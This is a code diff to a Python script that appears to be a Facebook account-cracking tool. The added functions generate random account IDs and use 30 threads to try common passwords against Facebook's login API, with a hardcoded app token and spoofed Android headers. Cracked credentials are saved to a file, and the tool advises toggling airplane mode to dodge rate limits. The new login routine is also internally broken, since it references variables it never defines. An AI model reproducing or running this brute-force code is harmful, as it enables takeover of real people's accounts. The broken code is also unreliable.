@@ -683,6 +683,8 @@ def main():
 		__Old3__()
 	elif ch in ('2','02','22','C','d'):
 	    __Old4__()
+	elif ch in ('6','06','62','C','d'):
+		__Old6__()
 	elif ch in ('0','00','92','C','d'):
 		__Old7__()
 		
@@ -765,6 +767,27 @@ def __Old3__():
         for mal in user:
             uid=year_code+mal
             jihad.submit(login4,uid)            
+    line();print(f'\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;160m!\033[1;37m');main()
+
+def __Old6__():
+    user = []
+    clear()
+    print(f"\33[38;5;160m[\033[1;97ma/$\33[38;5;160m] \033[1;97mEXAMPLE \33[38;5;160m  b6 \033[1;97m10000\33[38;5;37m|\033[1;97m20000\33[38;5;37m|\033[1;97m30000\33[38;5;37m|\033[1;97m40000")
+    linex()
+    limit = input(f"\33[38;5;160m[\033[1;97ma/$\33[38;5;160m] \033[1;97mSELECTION \33[38;5;160mb6 \033[1;97m")
+    linex()
+    year_code = input(" \033[1;91msim cod:- \033[1;93m")
+    for i in range(int(limit)):
+        data = str(random.choice(range(100000, 999999)))
+        user.append(data)
+    with tred(max_workers=30) as jihad:
+        clear()
+        print(f"\33[38;5;160m[\033[1;97m\33[38;5;160m] \033[1;97mTOTAL ID \33[38;5;160mb6 \033[1;97m{limit}")
+        print(f"\33[38;5;160m[\033[1;97m\33[38;5;160m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE ")
+        linex()
+        for mal in user:
+            email = year_code + mal
+            jihad.submit(login1, email)            
     line();print(f'\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mYOUR CRACKED HAS BEEN COMPLETED...\33[38;5;160m!');linex();print(f'\r\r\r\r\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mTOTAL OK \33[38;5;160m▶ \x1b[38;5;46m{len(oks)}');linex();input(f'\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mINTER TO BACK RAN AGAIN...\33[38;5;160m!\033[1;37m');main()
 
 def login1(uid):
@@ -948,6 +971,67 @@ def login3(uid):
             else:continue
         loop+=1
     except Exception as e:time.sleep(30)
+def login6(uid):
+    global oks, loop, cps
+    Session = requests.session()
+    try:
+        sys.stdout.write(f"\r\r\33[38;5;37m[\x1b[38;5;46mGSx\33[38;5;37m-\x1b[38;5;46mB1\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]")
+        sys.stdout.flush()
+        ua = random.choice(ugen)
+        ua = windows()
+        for PASSWORD in ["uid[:6]","uid[:8]","uid[:10]","123456","qwerty","QWERTY","PASSWORD","1234567","12345678","123456789","111111","112233","111222","57273200","59039200",]:
+            DATA = {"adid": "f0cc3703-45c9-4676-a119-67ea0804e790",
+                "format": "json",
+                "device_id": "dd6e74f5-9828-4f6e-9838-6556e5d7d9f4",
+                "email": "8928",
+                "password": "#PWD_FB4A:0:1755435990:8928",
+                "generate_analytics_claims": "1",
+                "community_id": "",
+                "cpl": "true",
+                "try_num": "1",
+                "family_device_id": "ef139bf6-6dd5-45ee-ae2b-f0203adc6b99",
+                "credentials_type": "password",
+                "source": "login",
+                "error_detail_type": "button_with_disabled",
+                "enroll_misauth": "false",
+                "generate_session_cookies": "1",
+                "generate_machine_id": "1",
+                "currently_logged_in_userid": "0",
+                "locale": "en_US",
+                "client_country_code": "US",
+                "fb_api_req_friendly_name": "authenticate",}
+            headers = {"User-Agent": "Dalvik/2.1.0 (Linux; U; Android 10; SM-T350 Build/QP1A.833267.427) [FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621679;FBDM/{density=2.0,width=720,height=1406};FBLC/lt_LT;FBCR/Bite;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A202F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
+                "Host": "graph.facebook.com",
+                "Accept-Encoding": "gzip, deflate",
+                "Accept": "*/*",
+                "Connection": "keep-alive",
+                "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
+                "X-FB-Friendly-Name": "authenticate",
+                "X-FB-Connection-Bandwidth": "30163486",
+                "X-FB-Net-HNI": "21204",
+                "X-FB-SIM-HNI": "31584",
+                "X-FB-Connection-Type": "unknown",
+                "Content-Type": "application/x-www-form-urlencoded",
+                "X-FB-HTTP-Engine": "Liger",}
+            URL = "https://graph.facebook.com/auth/login"
+            rp = requests.post(url, data=data, headers=head, allow_redirects=False, verify=True).json()
+            if "session_key" in rp:
+                print(f"\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mGSx\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97mb \x1b[38;5;46m{pw}\033[1;97m")
+                os.system('espeak -a 300 " Cracked Ok id,"')
+                open("/sdcard/GSx-M2-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
+                cps.append(uid)
+                break
+            elif "www.facebook.com" in rp["error"]["message"]:
+                print(f"\r\r\r\r\r\33[38;5;37m[\x1b[38;5;46mGSx\033[1;97m-\x1b[38;5;46mOK\33[38;5;37m] \x1b[38;5;46m{uid} \033[1;97mb \x1b[38;5;46m{pw}\033[1;97m")
+                os.system('espeak -a 300 " Cracked Ok id,"')
+                open("/sdcard/GSx-M1-OLD-OK.txt", "a").write(email + "|" + password + "\n")
+                oks.append(email)
+                break
+            else:
+                continue
+        loop += 1
+    except Exception as e:time.sleep(30)
+        
 def login4(uid):
     global oks,loop,cps
     Session=requests.session()
